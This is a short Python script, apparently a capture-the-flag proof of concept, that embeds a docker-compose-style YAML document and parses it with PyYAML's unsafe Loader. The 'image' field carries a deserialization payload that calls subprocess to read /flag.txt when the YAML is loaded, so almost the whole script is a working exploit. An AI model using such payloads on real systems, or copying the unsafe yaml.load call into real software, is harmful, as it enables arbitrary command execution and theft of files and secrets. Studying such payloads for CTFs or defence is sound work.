text = """
services:
  nginxproxy:
    image: !!python/object/apply:subprocess.check_output [["cat", "/flag.txt"]]
    container_name: Proxy
    restart: unless-stopped
    volumes:
      - ./conf/your-custom.conf:/etc/nginx/conf.d/default.conf
    ports:
      - 0.0.0.0:1337:80
    depends_on:
      - YourApp
    networks:
      - proxy
"""

import subprocess

print subprocess.check_output(["ls", "-la"])

import yaml
from yaml import Loader
data = yaml.load(text, Loader=Loader)

print data
